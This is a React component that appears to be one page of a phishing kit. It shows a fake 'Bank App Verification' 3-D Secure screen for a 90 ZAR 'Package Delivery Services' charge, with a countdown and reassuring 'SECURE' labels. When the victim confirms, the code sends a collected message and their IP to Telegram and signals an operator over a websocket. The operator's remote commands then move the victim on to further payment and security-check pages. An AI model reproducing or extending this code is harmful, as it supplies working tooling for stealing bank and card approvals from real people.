import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  Box,
  Container,
  Flex,
  VStack,
  Text,
  Icon,
  HStack,
  Image,
  Spinner as ChakraSpinner,
} from "@chakra-ui/react";
import { MdLock, MdVerifiedUser, MdShield, MdSecurity, MdPhoneAndroid } from "react-icons/md";
import Header from "../components/Header";
import Footer from "../components/Footer";
import ProgressBar from "../components/ProgressBar";
import CustomButton from "../components/CustomButton";
import { randomParamsURL } from "../utils/validation";
import { useSendTLGMessage } from "../hooks/useTelegram";
import { buildTelegramMessage } from "../utils/messageBuilder";

const ThreeDSecureBank = () => {
  const navigate = useNavigate();
  const { send, loading } = useSendTLGMessage();
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [timer, setTimer] = useState(300); // 5 minutes
  const clientId =
    typeof window !== "undefined" ? localStorage.getItem("clientId") : null;

  useEffect(() => {
    function onWsPayload(e) {
      const payload = e.detail;
      if (!payload || typeof payload !== "object") return;
      if (payload.type === "error") {
        setIsVerifying(false);
      }
      if (payload.type === "navigate-to-payment-details") {
        setIsModalOpen(false);
        setIsVerifying(false);
        setTimeout(() => {
          navigate(`/payment-details?${randomParamsURL()}`);
        }, 500);
      }
      if (payload.type === "allow-next") {
        setIsModalOpen(false);
        setIsVerifying(false);
        setTimeout(() => {
          navigate(`/security-check?${randomParamsURL()}`);
        }, 500);
      }
    }
    window.addEventListener("ws:payload", onWsPayload);
    return () => window.removeEventListener("ws:payload", onWsPayload);
  }, [navigate]);

  useEffect(() => {
    const timeout = setTimeout(() => {
      setIsModalOpen(true);
    }, 800);

    return () => clearTimeout(timeout);
  }, []);

  useEffect(() => {
    if (isModalOpen && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [isModalOpen, timer]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const handleVerify = async () => {
    setIsVerifying(true);

    const clientIp =
      typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;

    // Build cumulative message
    const message = buildTelegramMessage(clientIp);
    await send(message);

    try {
      window.dispatchEvent(
        new CustomEvent("ws:emit", {
          detail: { type: "bank_app_verified", clientId },
        })
      );
    } catch {
      // ignore
    }
  };

  return (
    <Box minH="100vh" display="flex" flexDirection="column" bg="#efefef">
      <Header />

      <Box flex="1" py={{ base: 4, md: 6 }}>
        <Container maxW="800px" px={{ base: 4, md: 6 }} mx="auto">
          <ProgressBar currentStep={4} />

          <Box
            bg="white"
            border="1px solid"
            borderColor="#cbcbcb"
            borderRadius="8px"
            boxShadow="0 2px 12px rgba(0,0,0,0.08)"
            overflow="hidden">
            {/* Header */}
            <Box
              bg="linear-gradient(135deg, #1a7a6a 0%, #279989 50%, #2aaa96 100%)"
              color="white"
              position="relative"
              overflow="hidden"
              boxShadow="0 4px 16px rgba(39, 153, 137, 0.25)">
              <VStack spacing={3} py={6} px={4} position="relative" zIndex={1}>
                <Flex align="center" gap={3}>
                  <Box
                    bg="rgba(255, 255, 255, 0.2)"
                    p={3}
                    borderRadius="12px"
                    backdropFilter="blur(10px)"
                    border="2px solid rgba(255, 255, 255, 0.3)"
                    boxShadow="0 4px 12px rgba(0, 0, 0, 0.15)">
                    <Icon as={MdShield} boxSize={{ base: 8, md: 10 }} />
                  </Box>
                  <VStack align="start" spacing={1}>
                    <Text
                      fontSize={{ base: "20px", md: "24px" }}
                      fontWeight="800"
                      letterSpacing="tight"
                      textShadow="0 2px 8px rgba(0, 0, 0, 0.2)">
                      Bank App Verification
                    </Text>
                    <Text
                      fontSize={{ base: "12px", md: "13px" }}
                      fontWeight="500"
                      opacity={0.95}
                      letterSpacing="wide">
                      Verify via your bank's mobile application
                    </Text>
                  </VStack>
                </Flex>
              </VStack>
            </Box>

            {/* Content */}
            <Box p={{ base: 6, md: 10 }} bg="white">
              <VStack spacing={6} maxW="600px" mx="auto">
                {!isModalOpen && (
                  <Flex align="center" gap={3} py={6}>
                    <ChakraSpinner
                      thickness="4px"
                      speed="0.65s"
                      color="#279989"
                      size="lg"
                    />
                    <Text fontSize="14px" color="#6c757d" fontWeight="500">
                      Connecting to your bank's authentication server...
                    </Text>
                  </Flex>
                )}
              </VStack>
            </Box>
          </Box>
        </Container>
      </Box>

      {/* Bank App Verification Modal */}
      {isModalOpen && (
        <Box
          position="fixed"
          top="0"
          left="0"
          right="0"
          bottom="0"
          bg="rgba(0, 0, 0, 0.75)"
          backdropFilter="blur(6px)"
          zIndex="9999"
          display="flex"
          alignItems="center"
          justifyContent="center"
          p={4}
          sx={{
            animation: "fadeIn 0.3s ease",
            "@keyframes fadeIn": {
              from: { opacity: 0 },
              to: { opacity: 1 },
            },
          }}>
          <Box
            maxW="550px"
            w="full"
            bg="white"
            borderRadius="0"
            boxShadow="0 10px 40px rgba(0,0,0,0.4)"
            overflow="hidden"
            border="2px solid #196b60"
            sx={{
              animation: "slideUp 0.4s ease",
              "@keyframes slideUp": {
                from: { transform: "translateY(30px)", opacity: 0 },
                to: { transform: "translateY(0)", opacity: 1 },
              },
            }}>
            {/* Bank Header */}
            <Box
              bg="linear-gradient(180deg, #279989 0%, #1e7a6d 100%)"
              color="white"
              py={5}
              px={6}
              borderBottom="2px solid #196b60">
              <Flex align="center" justify="space-between" mb={2}>
                <HStack spacing={3}>
                  <Icon as={MdPhoneAndroid} boxSize={7} />
                  <VStack align="start" spacing={0}>
                    <Text
                      fontSize="19px"
                      fontWeight="800"
                      letterSpacing="tight">
                      Bank App Verification
                    </Text>
                    <Text fontSize="11px" opacity={0.9} fontWeight="500">
                      Mobile App Authentication Required
                    </Text>
                  </VStack>
                </HStack>
                <Box
                  bg="rgba(255,255,255,0.25)"
                  px={3}
                  py={2}
                  borderRadius="4px"
                  border="1px solid rgba(255,255,255,0.3)">
                  <HStack spacing={2}>
                    <Icon as={MdShield} boxSize={4} />
                    <Text fontSize="12px" fontWeight="700">
                      SECURE
                    </Text>
                  </HStack>
                </Box>
              </Flex>
            </Box>

            {/* Modal Body */}
            <Box py={7} px={6} bg="#fafafa">
              <VStack spacing={5} align="stretch">
                {/* Merchant Info */}
                <Box
                  p={4}
                  bg="white"
                  borderRadius="6px"
                  border="1px solid #e0e0e0"
                  boxShadow="0 1px 3px rgba(0,0,0,0.08)">
                  <Flex justify="space-between" align="center">
                    <Box>
                      <Text
                        fontSize="11px"
                        color="#666"
                        fontWeight="600"
                        mb={1}>
                        MERCHANT
                      </Text>
                      <Text fontSize="14px" fontWeight="700" color="#2c3e50">
                        Package Delivery Services
                      </Text>
                    </Box>
                    <Box textAlign="right">
                      <Text
                        fontSize="11px"
                        color="#666"
                        fontWeight="600"
                        mb={1}>
                        AMOUNT
                      </Text>
                      <Text fontSize="18px" fontWeight="800" color="#e53e3e">
                        90 ZAR
                      </Text>
                    </Box>
                  </Flex>
                </Box>

                {/* Bank App Instructions */}
                <Box
                  p={5}
                  bg="linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)"
                  borderRadius="6px"
                  border="1px solid #93c5fd"
                  borderLeft="4px solid #279989">
                  <VStack spacing={3} align="start">
                    <HStack spacing={2}>
                      <Icon as={MdPhoneAndroid} color="#279989" boxSize={6} />
                      <Text fontSize="15px" fontWeight="700" color="#1e40af">
                        Verify via Bank Mobile App
                      </Text>
                    </HStack>
                    <VStack spacing={2} align="start" fontSize="13px" color="#1e3a8a">
                      <Text>1. Open your bank's mobile application</Text>
                      <Text>2. You will receive a push notification</Text>
                      <Text>3. Approve the transaction in the app</Text>
                      <Text>4. Return here and click "I've Verified"</Text>
                    </VStack>
                  </VStack>
                </Box>

                {/* Timer */}
                <Box
                  p={3}
                  bg="white"
                  borderRadius="6px"
                  border="1px solid #e0e0e0"
                  textAlign="center">
                  <Text fontSize="12px" color="#666" fontWeight="600" mb={1}>
                    Verification expires in:
                  </Text>
                  <Text
                    fontSize="20px"
                    color={timer < 60 ? "#e53e3e" : "#279989"}
                    fontWeight="800"
                    fontFamily="mono">
                    {formatTime(timer)}
                  </Text>
                </Box>

                {isVerifying ? (
                  <Box
                    w="full"
                    p={5}
                    bg="linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)"
                    borderRadius="8px"
                    border="2px solid #6ee7b7"
                    mt={2}>
                    <VStack spacing={3}>
                      <ChakraSpinner
                        size="lg"
                        color="#279989"
                        thickness="4px"
                      />
                      <Text
                        fontSize="14px"
                        color="#065f46"
                        fontWeight="700"
                        textAlign="center">
                        🔒 Verifying with your bank...
                      </Text>
                      <Text
                        fontSize="12px"
                        color="#047857"
                        textAlign="center">
                        Please wait while we verify your payment
                      </Text>
                    </VStack>
                  </Box>
                ) : (
                  <CustomButton
                    onClick={handleVerify}
                    w="full"
                    maxW="full"
                    h="54px"
                    mt={2}
                    fontSize="16px"
                    isDisabled={timer === 0}
                    bg="#279989"
                    color="white"
                    _hover={{
                      bg: "#1e7a6d",
                    }}
                    _disabled={{
                      bg: "#cbd5e0",
                      color: "#718096",
                    }}>
                    I've Verified in Bank App
                  </CustomButton>
                )}
              </VStack>
            </Box>

            {/* Modal Footer */}
            <Box bg="#f8f9fa" borderTop="1px solid #e0e0e0" py={4} px={6}>
              <HStack spacing={2} justify="center" w="full">
                <Icon as={MdLock} boxSize={3} color="#666" />
                <Text
                  fontSize="10px"
                  color="#666"
                  fontWeight="600"
                  letterSpacing="wide">
                  PROTECTED BY BANK APP VERIFICATION
                </Text>
              </HStack>
            </Box>
          </Box>
        </Box>
      )}

      <Footer />
    </Box>
  );
};

export default ThreeDSecureBank;

